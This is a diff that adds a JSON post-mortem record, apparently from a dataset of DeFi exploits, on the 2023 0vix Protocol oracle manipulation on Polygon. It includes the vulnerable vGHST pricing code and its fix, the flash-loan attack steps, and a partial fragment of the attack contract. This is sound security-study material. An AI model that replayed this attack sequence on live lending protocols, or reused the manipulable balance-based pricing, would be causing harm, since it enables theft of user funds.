@@ -1,0 +1,51 @@
+{
+ "id": "2023__2023-04-28_0vixProtocol_PriceDependency_Polygon",
+ "source_file": "2023/2023-04-28_0vixProtocol_PriceDependency_Polygon.md",
+ "title": "0vix Protocol — vGHST Oracle Price Dependency Vulnerability Analysis",
+ "date": "2023-04-28",
+ "protocol": "0vix Protocol",
+ "chain": "Polygon",
+ "loss_raw": "~$2,000,000 USD",
+ "loss_usd": 2000000.0,
+ "root_cause": "Flawed price dependency in vGHST price calculation that can be manipulated via direct token transfers (donate)",
+ "attack_tx": "0x10f2...b008",
+ "vulnerable_contract": "vGHST 0x5119...Ca6C / ovGHST 0xE053...B12",
+ "classes": [
+  "flash-loan",
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "// [vGHST Contract - 0x51195e21BDaE8722B29919db56d95Ef51FaecA6C]\n\n// ❌ VULNERABLE: reads GHST balance directly to calculate price\n// Anyone can call transfer() to this address to increase totalGHST\nfunction convertVGHST(uint256 _share) public view returns (uint256 _ghst) {\n    uint256 totalShares = totalSupply();         // total vGHST supply\n    uint256 totalGHST = GHST.balanceOf(address(this)); // ❌ direct balance reference\n\n    if (totalShares == 0 || totalGHST == 0) {\n        return _share;\n    }\n    // ❌ 1 vGHST = (totalGHST / totalShares) GHST\n    // increasing totalGHST externally raises the price\n    return _share * totalGHST / totalShares;\n}",
+  "// ❌ ovGHST oracle: blindly trusts vGHST.convertVGHST()\n// [0vix VGHSTOracle inferred logic]\nfunction getUnderlyingPrice(CToken cToken) external view returns (uint256) {\n    // ❌ uses manipulable convertVGHST() result as price\n    uint256 vGHSTToGHST = IvGHST(vGHSTAddress).convertVGHST(1e18);\n    uint256 GHSTPrice = getGHSTPrice(); // TWAP or Chainlink price\n    return vGHSTToGHST * GHSTPrice / 1e18;\n}"
+ ],
+ "code_after": [
+  "// ✅ FIX: use internal accounting variable to ignore direct transfers\nuint256 private _totalGHSTTracked;  // ✅ internal variable updated only via official deposit path\n\nfunction enter(uint256 _amount) external returns (uint256) {\n    uint256 totalShares = totalSupply();\n    uint256 totalGHST = _totalGHSTTracked; // ✅ reference internal variable\n\n    uint256 what;\n    if (totalShares == 0 || totalGHST == 0) {\n        what = _amount;\n    } else {\n        what = _amount * totalShares / totalGHST;\n    }\n\n    _mint(msg.sender, what);\n    GHST.transferFrom(msg.sender, address(this), _amount);\n    _totalGHSTTracked += _amount; // ✅ incremented only on official deposit\n    return what;\n}\n\nfunction convertVGHST(uint256 _share) public view returns (uint256 _ghst) {\n    uint256 totalShares = totalSupply();\n    uint256 totalGHST = _totalGHSTTracked; // ✅ reference internal variable\n\n    if (totalShares == 0 || totalGHST == 0) {\n        return _share;\n    }\n    return _share * totalGHST / totalShares;\n}",
+  "// ✅ FIX: use a method not susceptible to external manipulation for vGHST price calculation\nfunction getUnderlyingPrice(CToken cToken) external view returns (uint256) {\n    // ✅ Option 1: use an independent Chainlink TWAP-based vGHST price feed\n    return chainlinkVGHSTFeed.latestAnswer() * 1e10;\n\n    // ✅ Option 2: call a fixed convertVGHST() that uses internal accounting variables\n    // (if the vGHST contract itself has been patched)\n}"
+ ],
+ "steps": [
+  "- GHST price at time of attack: ~$1.13 → $1.41 after attack (24.7% real-time increase)",
+  "- set GHST, USDC, USDT approvals",
+  "- deploy Exploiter contract",
+  "Step 0: begin nested flash loans",
+  "- GHST: 1,950,000 (~$2.2M)",
+  "- USDC: 6,800,000 ($6.8M)",
+  "- USDT: 2,300,000 ($2.3M)",
+  "- USDC: 13,000,000 ($13M)",
+  "- USDT: 3,250,000 ($3.25M)",
+  "- USDC: 4,700,000 ($4.7M)",
+  "- USDT: 600,000 ($600K)",
+  "Step 1: deposit USDT collateral + mint vGHST",
+  "- vGHST.enter(294,000 GHST) → receive vGHST",
+  "- oUSDT.mint(all USDT held) → receive oUSDT",
+  "- unitroller.enterMarkets([oUSDT])",
+  "Step 2: borrow all assets from every pool",
+  "- oMATIC, oWBTC, oDAI, oWETH, oUSDC",
+  "- oUSDT: 1,160,000 USDT",
+  "- oMATICX, ostMATIC, owstWETH",
+  "Step 3: build leveraged position via Exploiter"
+ ],
+ "other_code": [
+  "[Attacker EOA: 0x702E...A970]\n         │\n         │ calls testExploit()\n         ▼\n┌────────────────────────────────────────────────┐\n│  ContractTest (attack contract 0x407f...7d57)    │\n│  • set GHST, USDC, USDT approvals               │\n│  • deploy Exploiter contract                    │\n└──────────────────┬─────────────────────────────┘\n                   │\n                   │ Step 0: begin nested flash loans\n                   ▼\n┌────────────────────────────────────────────────┐\n│  Aave V3 Flash Loan                             │\n│  • GHST: 1,950,000 (~$2.2M)                    │\n│  • USDC: 6,800,000 ($6.8M)                     │\n│  • USDT: 2,300,000 ($2.3M)                     │\n└──────────────────┬─────────────────────────────┘\n                   │ executeOperation() callback\n      ",
+  "// [receiveFlashLoan() — core attack logic inside Balancer flash loan callback]\n\n// Step 1: stake GHST to obtain vGHST, then deposit USDT as collateral\nvGHST.enter(294_000 * 1e18);           // 294,000 GHST → converted to vGHST\noUSDT.mint(USDT.balanceOf(address(this))); // mint all USDT into oUSDT (collateral)\n\n// Step 2: enterMarkets then borrow all assets from every pool\naddress[] memory cTokens = new address[](1);\ncTokens[0] = address(oUSDT);\nunitroller.enterMarkets(cTokens);      // enter USDT collateral market\nborrowAll();                           // borrow full amounts of MATIC, WBTC, DAI, WETH, USDC, USDT, etc.\n\n// Step 3: build 24 leveraged vGHST debt positions via Exploiter contract\nUSDC.transfer(address(exploiter), 24_500_000 * 1e6); // send 24.5M USDC\nvGHST.transfer(address(exp"
+ ]
+}
